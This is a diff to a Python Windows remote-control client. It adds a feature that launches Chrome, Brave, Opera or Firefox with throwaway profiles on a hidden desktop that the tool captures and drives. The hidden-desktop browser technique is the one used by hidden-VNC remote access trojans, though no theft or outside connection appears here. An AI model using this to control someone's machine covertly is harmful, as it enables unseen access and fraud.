@@ -4,9 +4,12 @@ from __future__ import annotations
 import ctypes
 from ctypes import wintypes
 import logging
+import os
 import platform
 import queue
+import shutil
 import subprocess
+import tempfile
 import threading
 import time
 import uuid
@@ -18,6 +21,53 @@ from remote_client.control.input_controller import ControlCommand, InputControll
 
 
 logger = logging.getLogger(__name__)
+
+CHROMIUM_APPS = {"chrome", "brave", "opera"}
+APP_EXECUTABLES = {
+    "chrome": ["chrome.exe"],
+    "brave": ["brave.exe", "brave-browser.exe"],
+    "opera": ["opera.exe", "launcher.exe"],
+    "firefox": ["firefox.exe"],
+}
+APP_PATHS = {
+    "chrome": [
+        os.path.join(base, "Google", "Chrome", "Application", "chrome.exe")
+        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
+        if base
+    ],
+    "brave": [
+        os.path.join(base, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")
+        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
+        if base
+    ],
+    "opera": [
+        os.path.join(base, "Opera", "launcher.exe")
+        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"))
+        if base
+    ]
+    + [
+        os.path.join(base, "Programs", "Opera", "launcher.exe")
+        for base in (os.getenv("LocalAppData"),)
+        if base
+    ],
+    "firefox": [
+        os.path.join(base, "Mozilla Firefox", "firefox.exe")
+        for base in (os.getenv("ProgramFiles"), os.getenv("ProgramFiles(x86)"), os.getenv("LocalAppData"))
+        if base
+    ],
+}
+
+
+def _resolve_app_executable(app_name: str) -> str | None:
+    for exe_name in APP_EXECUTABLES.get(app_name, []):
+        found = shutil.which(exe_name)
+        if found:
+            return found
+    for candidate in APP_PATHS.get(app_name, []):
+        if candidate and os.path.isfile(candidate):
+            return candidate
+    return None
+
 
 
 if platform.system() == "Windows":
@@ -353,6 +403,7 @@ class HiddenDesktopSession:
         self.name = name or f"rc_hidden_{uuid.uuid4().hex[:8]}"
         self._handle = _create_desktop(self.name)
         self._processes: list[subprocess.Popen] = []
+        self._profile_dirs: dict[str, str] = {}
         if start_shell:
             self._start_shell()
         self._capture = HiddenDesktopCapture(self._handle, draw_cursor=True)
@@ -369,7 +420,7 @@ class HiddenDesktopSession:
             startup = subprocess.STARTUPINFO()
             startup.lpDesktop = self.name
             startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-            startup.wShowWindow = 0
+            startup.wShowWindow = 1
             self._processes.append(subprocess.Popen("explorer.exe", startupinfo=startup))
         except Exception as exc:
             logger.warning("Failed to start explorer on hidden desktop: %s", exc)
@@ -377,10 +428,56 @@ class HiddenDesktopSession:
                 startup = subprocess.STARTUPINFO()
                 startup.lpDesktop = self.name
                 startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
-                startup.wShowWindow = 0
+                startup.wShowWindow = 1
                 self._processes.append(subprocess.Popen("cmd.exe", startupinfo=startup))
             except Exception as cmd_exc:
                 logger.warning("Failed to start cmd on hidden desktop: %s", cmd_exc)
+
+    def _ensure_profile_dir(self, app_name: str) -> str:
+        existing = self._profile_dirs.get(app_name)
+        if existing:
+            return existing
+        base_dir = os.path.join(tempfile.gettempdir(), "rc_hidden_profiles")
+        os.makedirs(base_dir, exist_ok=True)
+        profile_dir = os.path.join(base_dir, f"{app_name}_{uuid.uuid4().hex[:8]}")
+        os.makedirs(profile_dir, exist_ok=True)
+        self._profile_dirs[app_name] = profile_dir
+        return profile_dir
+
+    def launch_application(self, app_name: str) -> None:
+        normalized = (app_name or "").strip().lower()
+        if normalized not in APP_EXECUTABLES:
+            raise ValueError(f"Unsupported application '{app_name}'.")
+        executable = _resolve_app_executable(normalized)
+        if not executable:
+            raise FileNotFoundError(f"Executable for '{normalized}' not found.")
+        profile_dir = self._ensure_profile_dir(normalized)
+        if normalized in CHROMIUM_APPS:
+            args = [
+                executable,
+                f"--user-data-dir={profile_dir}",
+                "--new-window",
+                "--no-first-run",
+                "--no-default-browser-check",
+            ]
+        else:
+            args = [
+                executable,
+                "-profile",
+                profile_dir,
+                "-no-remote",
+            ]
+        startup = subprocess.STARTUPINFO()
+        startup.lpDesktop = self.name
+        startup.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        startup.wShowWindow = 1
+        process = subprocess.Popen(
+            args,
+            startupinfo=startup,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        self._processes.append(process)
 
     def close(self) -> None:
         self._capture.close()
@@ -394,4 +491,6 @@ class HiddenDesktopSession:
                     proc.kill()
                 except Exception:
                     continue
+        for profile_dir in self._profile_dirs.values():
+            shutil.rmtree(profile_dir, ignore_errors=True)
         _close_desktop(self._handle)
